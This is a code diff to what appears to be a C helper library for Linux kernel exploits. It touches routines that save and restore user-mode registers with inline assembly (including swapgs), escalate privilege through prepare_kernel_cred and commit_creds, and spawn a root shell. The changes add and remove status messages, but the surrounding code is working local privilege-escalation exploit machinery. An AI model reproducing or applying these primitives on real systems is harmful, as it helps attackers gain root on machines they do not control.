@@ -3,7 +3,6 @@
 #include "vars.h"
 
 void spawn_shell(void) {
-    puts("[+] returned to user land");
     uid_t uid = getuid();
     if (uid != 0) {
         printf("[-] failed to get root (uid: %d)\n", uid);
@@ -18,6 +17,7 @@ void spawn_shell(void) {
 }
 
 void save_state(void) {
+    puts("[ ] saving user cs, ss, rsp, and rflags");
     asm volatile(
         ".intel_syntax noprefix;"
         "mov %0, cs;"
@@ -29,9 +29,17 @@ void save_state(void) {
         : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
         :
         : "memory");
+    printf("      user_cs     = 0x%016lx\n", user_cs);
+    printf("      user_rflags = 0x%016lx\n", user_rflags);
+    printf("      user_rsp    = 0x%016lx\n", user_rsp);
+    printf("      user_ss     = 0x%016lx\n", user_ss);
 }
 
 void restore_state(void) {
+    puts("[+] restoring state");
+    if (user_rsp == 0) {
+        puts("[-] please call save_state in advance");
+    }
     asm volatile(
         ".intel_syntax noprefix;"
         "swapgs;"
@@ -47,6 +55,7 @@ void restore_state(void) {
 }
 
 void escalate_privilege(void) {
+    puts("[+] escalating privilege");
     char *(*pkc)(int) = (void *)(addr_prepare_kernel_cred);
     void (*cc)(char *) = (void *)(addr_commit_creds);
     if (addr_init_cred == DUMMY_VALUE + kbase_offset) {
